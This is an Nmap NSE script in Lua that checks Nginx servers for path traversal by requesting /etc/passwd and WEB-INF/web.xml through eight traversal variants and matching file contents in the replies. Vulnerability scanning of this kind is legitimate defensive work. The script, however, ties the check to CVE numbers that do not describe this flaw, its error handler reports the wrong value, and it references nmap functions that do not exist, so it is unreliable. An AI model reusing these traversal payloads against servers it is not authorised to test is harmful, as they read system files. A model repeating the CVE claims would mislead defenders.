local http = require "http"
local stdnse = require "stdnse"
local nmap = require "nmap"
local shortport = require "shortport"



-- nmp function cache
local nmap_register = nmap.register_script
local nmap_settitle = nmap.set_title
local nmap_resolve = nmap.resolve
local nmap_get_port_state = nmap.get_port_state
local nmap_set_port_state = nmap.set_port_state
local comm = nmap.comm
local new_socket = nmap.new_socket
local get_timeout = nmap.get_timeout

-- Performance optimizations
local format = string.format
local lower = string.lower
local upper = string.upper
local byte = string.byte
local sub = string.sub
local match = string.match
local gmatch = string.gmatch
local gsub = string.gsub
local find = string.find
local rep = string.rep
local char = string.char
local concat = table.concat
local insert = table.insert
local remove = table.remove
local sort = table.sort
local move = table.move or function(a1, f, e, t, a2)
    if not a2 then a2 = a1 end
    for i = f, e do a2[t + i - f] = a1[i] end
    return a2
end
local tostring = tostring
local tonumber = tonumber
local type = type
local pcall = pcall
local pairs = pairs
local ipairs = ipairs
local unpack = unpack or table.unpack
local setmetatable = setmetatable
local getmetatable = getmetatable
local error = error
local select = select
local clock = nmap.clock
local msleep = nmap.msleep
local sleep = stdnse.sleep
local strsplit = stdnse.strsplit
local format_output = stdnse.format_output
local output_table = stdnse.output_table

description = [[Detects Nginx misconfiguration allowing alias-based path traversal (CVE-2013-4547, CVE-2018-16843).]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"vuln", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and port.service == "http" end

action = function(host, port)
  local ok, result = pcall(function()
    local findings = {}
    local server_banner = ""
    local server_version = nil

    local banner_req = http.get(host, port, "/")
    if banner_req and banner_req.headers and banner_req.headers["server"] then
      local sv = banner_req.headers["server"]
      server_banner = type(sv) == "table" and sv[1] or sv
      server_version = server_banner:match("nginx/([%d%.]+)")
    end

    local payloads = {
      {path = "/static/../etc/passwd", checks = {"root:.*:0:0:", "daemon:.*:1:1:", "bin:.*:2:2:"}, label = "static traversal"},
      {path = "/assets/..%2f..%2fetc/passwd", checks = {"root:", "daemon:", "nobody:"}, label = "encoded traversal"},
      {path = "/files/..;/..;/etc/passwd", checks = {"root:", "daemon:"}, label = "semicolon traversal"},
      {path = "/uploads/../etc/passwd", checks = {"root:.*:0:0:", "daemon:"}, label = "uploads traversal"},
      {path = "/static/../WEB-INF/web.xml", checks = {"web%-app", "<web-app", "servlet"}, label = "WEB-INF read"},
      {path = "/static/..%2f..%2fWEB-INF/web.xml", checks = {"web%-app", "servlet"}, label = "encoded WEB-INF"},
      {path = "/assets/..\\..\\WEB-INF\\web.xml", checks = {"web%-app"}, label = "backslash traversal"},
      {path = "/..;/..;/WEB-INF/web.xml", checks = {"web%-app", "servlet"}, label = "matrix traversal"},
    }

    for _, p in ipairs(payloads) do
      local req = http.get(host, port, p.path)
      if req and req.status and req.status >= 200 and req.status < 400 then
        local body = req.body or ""
        for _, check in ipairs(p.checks) do
          if body:match(check) then
            local excerpt = body:sub(1, 80):gsub("\n", " "):gsub("\r", "")
            insert(findings, {path = p.path, label = p.label, check = check, excerpt = excerpt, status = req.status})
            break
          end
        end
        if p.path:match("etc/passwd") and req.status == 200 and #body > 50 and not body:match("<html") and not body:match("<HTML") then
          local excerpt = body:sub(1, 80):gsub("\n", " "):gsub("\r", "")
          insert(findings, {path = p.path, label = p.label, check = "raw file content", excerpt = excerpt, status = req.status})
        end
      end
    end

    if #findings > 0 then
      local result = output_table()
      result.cve = "CVE-2013-4547, CVE-2018-16843"
      result.severity = "HIGH"
      result.vulnerable = true
      result.server = server_banner
      result.version = server_version or "unknown"
      result.detail = ("Nginx path traversal confirmed via %d vector(s)"):format(#findings)
      for i, f in ipairs(findings) do
        result[("vector_%d"):format(i)] = ("%s (%s) -> status %d, matched: %s"):format(f.path, f.label, f.status, f.check)
      end
      if server_version then
        local maj, min, pat = server_version:match("(%d+)%.(%d+)%.(%d+)")
        if maj and min then
          local num = tonumber(maj) * 10000 + tonumber(min) * 100 + tonumber(pat or 0)
          if num < 10400 then
            result.version_note = ("Nginx %s is within vulnerable range"):format(server_version)
          end
        end
      end
      return result
    end

    local result = output_table()
    result.cve = "CVE-2013-4547, CVE-2018-16843"
    result.severity = "LOW"
    result.vulnerable = false
    result.server = server_banner
    result.version = server_version or "unknown"
    result.detail = "No Nginx path traversal detected"
    return result
  end)
  if not ok then
    local result = output_table()
    result.cve = "CVE-2013-4547"
    result.severity = "MEDIUM"
    result.vulnerable = false
    result.detail = "Error during scan: " .. tostring(result)
    result.error = true
    return result
  end
  return result
end
